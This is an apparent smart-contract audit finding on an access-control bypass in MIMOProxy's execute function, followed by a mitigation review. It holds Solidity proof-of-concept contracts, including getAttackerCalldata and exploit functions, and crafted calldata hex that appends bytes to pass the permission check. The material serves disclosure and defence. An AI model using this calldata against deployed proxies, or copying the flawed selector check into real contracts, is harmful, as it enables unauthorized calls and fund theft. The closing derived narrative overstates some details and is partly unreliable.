---
id: 16672
severity: "High"
---

# Incorrect implementation of access control in MIMOProxy:execute

## Description

There is a function `execute` in `MIMOProxy` smart contract. The function performs a delegate call to the user-specified address with the specified data. As an access control, the function checks that either it was called by the owner or the owner has previously approved that the sender can call a specified target with specified calldata. See <https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104>.

The check itself:
```solidity
    if (owner != msg.sender) {
      bytes4 selector;
      assembly {
        selector := calldataload(data.offset)
      }
      if (!_permissions[msg.sender][target][selector]) {
        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);
      }
    }
```

The problem is how the `selector` is calculated. Specifically, `calldataload(data.offset)` - reads first 4 bytes of `data`. Imagine `data.length == 0`, does it mean that `calldataload(data.offset)` will return `bytes4(0)`? No.

Let’s see how calldata are accepted by functions in Solidity. The solidity function checks that the calldata length is less than needed, but does NOT check that there is no redundant data in calldata. That means, the function `execute(address target, bytes calldata data)` will definitely accept data that have `target` and `data`, but also in calldata can be other user-provided bytes. As a result, `calldataload(data.offset)` can read trash, but not the `data` bytes.

And in the case of `execute` function, an attacker can affect the execution by providing `trash` data at the end of the function. Namely, if the attacker has permission to call the function with some `signature`, the attacker can call proxy contract bypass check for signature and make delegate call directly with zero calldata.

Please see proof-of-concept (PoC), `getAttackerCalldata` returns a calldata with which it is possible to bypass check permission for signature. Function `execute` from PoC simulate check for permission to call `signatureWithPermision`, and enforce that `data.length == 0`. With calldata from `getAttackerCalldata` it works.

Any account that has permission to call at least one function (signature) to the contract can call fallback function without permission to do so.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT OR Apache-2.0

pragma solidity ^0.8.0;

interface IMIMOProxy {
  event Execute(address indexed target, bytes data, bytes response);

  event TransferOwnership(address indexed oldOwner, address indexed newOwner);

  function initialize() external;

  function getPermission(
    address envoy,
    address target,
    bytes4 selector
  ) external view returns (bool);

  function owner() external view returns (address);

  function minGasReserve() external view returns (uint256);

  function execute(address target, bytes calldata data) external payable returns (bytes memory response);

  function setPermission(
    address envoy,
    address target,
    bytes4 selector,
    bool permission
  ) external;

  function transferOwnership(address newOwner) external;

  function multicall(address[] calldata targets, bytes[] calldata data) external returns (bytes[] memory);
}

contract PoC {
    bytes4 public signatureWithPermision = bytes4(0xffffffff);

    // Call this function with calldata that can be prepared in `getAttackerCalldata`
    function execute(address target, bytes calldata data) external {
        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }

        require(selector == signatureWithPermision);

        require(data.length == 0);
    }

    // Function that prepare attacker calldata
    function getAttackerCalldata() public view returns(bytes memory)  {
        bytes memory usualCalldata = abi.encodeWithSelector(IMIMOProxy.execute.selector, msg.sender, new bytes(0));
        return abi.encodePacked(usualCalldata, bytes32(signatureWithPermision));
    }
}
```

## Recommendation

Add `require(data.length >= 4);`.

This means that at worst you could directly use...
What the finding also implies, is that if...
This POC looks valid to me.

Basically what the warden mean is if you construct the calldata like execute(some_addr, "") + 0xffffff

    0x1cff79cd0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000^ffffffff

`data.offset` would be at ^  
and `calldataload(data.offset)` would read 0xffffff

This might be clearer

```solidity
pragma solidity ^0.8.0;

contract PoC {
    bytes4 public signatureWithPermision = bytes4(0xdead1337);

    // Call this function with calldata that can be prepared in `getAttackerCalldata`
    function execute(address target, bytes calldata data) view external returns(bytes memory) {
        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }
        require(selector == signatureWithPermision, "bad selector");
        return data;
    }

    // Function that prepare attacker calldata
    function getAttackerCalldata() public view returns(bytes memory)  {
        bytes memory usualCalldata = abi.encodeWithSelector(this.execute.selector, msg.sender, new bytes(0));
        return abi.encodePacked(usualCalldata, signatureWithPermision);
    }

    function exploit() external returns(bytes memory data) {
        (, data) = address(this).call(getAttackerCalldata());
    }
}
```
If you call `exploit`, it would succeed but it shouldn’t (since exploit call execute with `0x00000000....` instead of the permitted 4bytes `0xdead1337`). 

The exploit here is if you permitted contract A to run function foo only, A.fallback() is also permitted.

Your `getSelector` PoC won’t work if you are passing a non-empty bytes, it would work if you construct a call like `0x0cbd17c800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000dead1337` which is equivalent to calling `getSelector("")` with some extra data `dead1337` at the end.

Consider the calldata layout  
[00] 0cbd17c8  
[04] 0000000000000000000000000000000000000000000000000000000000000020 (data offset)  
[24] 0000000000000000000000000000000000000000000000000000000000000000 (data len)  
[44] dead1337
data.offset = 0x04 + 0x20 (data offset) + 0x20 (1 word for length) = 0x44

**horsefacts (warden) reviewed mitigation:**

**Status:** ✅ Resolved

**Finding:** A warden identified that callers could bypass a permissions check in `MIMOProxy#execute` by passing specially constructed calldata, enabling the caller to invoke a contract’s fallback function.

**What changed:** `MIMOProxy#execute` now reads the first four bytes of the `data` parameter directly rather than using `data.offset` to extract the function selector from calldata. 

**Why it works:** Since attackers can no longer manipulate the extracted selector, they cannot bypass the permissions check. A [unit test](https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/01_unit/proxy/MIMOProxy.test.ts#L103) demonstrates this behavior.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the access‑control logic of the proxy contract’s execute function. Instead of extracting the function selector from the supplied calldata payload, the contract reads the first four bytes starting at the dynamic data offset (data.offset). When the caller passes an empty bytes array, Solidity still permits additional trailing bytes in the overall transaction calldata, and the calldataload instruction will read those trailing bytes rather than the intended empty payload. Consequently, an attacker who already possesses permission for any single selector can craft a call where data.length is zero but extra bytes are appended after the encoded parameters. The selector read from the trailing bytes will be arbitrary, allowing the permission check to be bypassed and the delegatecall to be performed with essentially no calldata. This enables the caller to invoke the fallback function of the target contract or any other function that does not require a selector match, violating the intended permission model. The impact is that any user who has been granted at least one allowed selector can execute arbitrary code on the target contract, potentially stealing funds, altering state, or disrupting protocol logic. The bug manifests only when the execute function is invoked with an empty data argument; under normal non‑empty payloads the selector is read correctly. It is difficult to notice because Solidity does not automatically reject excess calldata beyond the declared parameters, and the selector extraction uses a low‑level assembly read that silently consumes whatever bytes happen to be present at the calculated offset. The issue was discovered during a manual security audit that included a proof‑of‑concept showing that appending a four‑byte value after an empty data array allowed the check to be circumvented. To remediate the flaw, the contract should validate that the calldata contains at least four bytes for the selector (e.g., require(data.length >= 4)) or extract the selector from the data array itself rather than from the raw calldata offset. This class of bug belongs to the broader category of improper calldata handling and insecure selector extraction, where assumptions about calldata layout are violated, leading to authorization bypass and unintended execution paths.
